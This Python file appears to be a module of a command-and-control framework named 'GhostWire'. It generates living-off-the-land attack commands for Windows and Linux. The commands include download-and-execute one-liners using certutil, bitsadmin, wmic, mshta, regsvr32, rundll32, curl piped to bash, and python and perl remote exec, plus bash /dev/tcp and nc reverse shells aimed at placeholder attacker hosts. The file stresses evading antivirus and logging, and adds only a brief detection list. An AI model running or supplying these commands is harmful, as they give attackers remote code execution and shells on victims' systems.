"""
GhostWire LOLBins Module
========================

This module demonstrates Living-Off-The-Land (LOLBins) techniques that
use native operating system binaries to execute code and evade detection.
These techniques leverage legitimate system tools for malicious purposes.

LOLBins Techniques:
- Windows: certutil, bitsadmin, wmic, rundll32, powershell
- Linux: curl, wget, bash, nc, python
- Cross-platform: Fileless execution and download methods

Stealth Benefits:
- Uses legitimate system binaries (less likely to be blocked)
- Bypasses traditional antivirus signature detection
- Appears as normal system activity in logs
- Leverages trusted execution paths

Security Implications:
- These techniques are commonly used in real-world attacks
- Detection requires behavioral analysis and process monitoring
- Understanding these methods helps improve defensive measures
- Many legitimate tools can be abused for malicious purposes

Usage:
    module lolbins

Note: This module provides educational examples of LOLBins techniques.
The commands shown are templates that require proper configuration
and should only be used in authorized testing environments.
"""
import platform
import io
import sys

class LOLBins:
    """
    LOLBins Executor: Generates commands using native OS binaries for stealth.
    
    This class provides examples of Living-Off-The-Land techniques that use
    legitimate system binaries to execute code, download files, and establish
    connections while evading traditional detection methods.
    
    Usage: module lolbins
    """
    
    @staticmethod
    def _get_windows_templates():
        """
        Returns a dictionary of common Windows LOLBins command templates.
        
        This method provides examples of how legitimate Windows binaries
        can be used for malicious purposes such as file download and
        code execution.
        
        Returns:
            dict: Dictionary of LOLBins technique names and command templates
        """
        # Example URLs and paths (replace with actual values)
        url = "http://<YOUR_SERVER>/payload.txt"
        out_path = "C:\\Windows\\Tasks\\payload.ps1"
        
        return {
            "Download with certutil": f"certutil.exe -urlcache -split -f {url} {out_path}",
            "Download with bitsadmin": f"bitsadmin /transfer ghostwire_dl /download /priority normal {url} {out_path}",
            "Execute PowerShell script": f"powershell.exe -ExecutionPolicy Bypass -File {out_path}",
            "Execute with wmic": f"wmic.exe process call create \"powershell.exe -c 'IEX(New-Object Net.WebClient).DownloadString(\\\"{url}\\\")'\"",
            "Execute with rundll32": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://<YOUR_SERVER>/payload.sct\")",
            "Execute with regsvr32": f"regsvr32.exe /s /n /u /i:{url} scrobj.dll",
            "Execute with mshta": f"mshta.exe javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"{url}\\\")\"',0,true);close();"
        }

    @staticmethod
    def _get_linux_templates():
        """
        Returns a dictionary of common Linux LOLBins/GTFOBins command templates.
        
        This method provides examples of how legitimate Linux binaries can
        be used for malicious purposes such as file download, code execution,
        and reverse shell establishment.
        
        Returns:
            dict: Dictionary of LOLBins technique names and command templates
        """
        # Example URLs and paths (replace with actual values)
        url = "http://<YOUR_SERVER>/payload.sh"
        out_path = "/tmp/payload.sh"
        
        return {
            "Download with curl": f"curl -o {out_path} {url}",
            "Download with wget": f"wget -O {out_path} {url}",
            "Execute with bash": f"bash {out_path}",
            "Reverse shell with bash": "/bin/bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1",
            "Fileless execution with curl": "curl -s {url} | bash",
            "Execute with python": f"python -c \"import urllib; exec(urllib.urlopen('{url}').read())\"",
            "Execute with perl": f"perl -e 'use LWP::Simple; eval(LWP::Simple::get(\"{url}\"))'",
            "Execute with nc": "nc -e /bin/bash <YOUR_IP> <YOUR_PORT>"
        }

    @staticmethod
    def run_remote(args):
        """
        Main entry point for the LOLBins module.
        
        This method is called by the C2 framework when the module is executed.
        It generates platform-specific LOLBins command templates for
        educational purposes and demonstrates stealth execution techniques.
        
        Args:
            args: Command-line arguments (not used in this module)
            
        Returns:
            str: Complete output with LOLBins examples
        """
        # Capture stdout to return as string
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()

        try:
            print(f"[+] Generating LOLBins/GTFOBins command templates for {platform.system()}...")
            print("[!] Note: These are templates. You must replace placeholder values like <YOUR_SERVER>.")
            
            # Platform-specific LOLBins techniques
            if platform.system() == "Windows":
                templates = LOLBins._get_windows_templates()
                print("\nWindows LOLBins Examples:")
                for name, cmd in templates.items():
                    print(f"\n--- {name} ---")
                    print(f"  {cmd}")
                    
            elif platform.system() == "Linux":
                templates = LOLBins._get_linux_templates()
                print("\nLinux/Unix LOLBins Examples:")
                for name, cmd in templates.items():
                    print(f"\n--- {name} ---")
                    print(f"  {cmd}")
                    
            else:
                print(f"[!] Unsupported OS for this module: {platform.system()}")

            # Additional information about LOLBins
            print(f"\n--- LOLBins Detection and Mitigation ---")
            print("Detection methods:")
            print("  - Process monitoring and command line analysis")
            print("  - Network traffic analysis for downloads")
            print("  - Behavioral analysis of system binaries")
            print("  - Log analysis for unusual command patterns")
            
            print(f"\nMitigation strategies:")
            print("  - Application whitelisting")
            print("  - Network segmentation and monitoring")
            print("  - Endpoint detection and response (EDR)")
            print("  - Regular security awareness training")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            # Restore stdout
            sys.stdout = old_stdout
            
        return captured_output.getvalue()
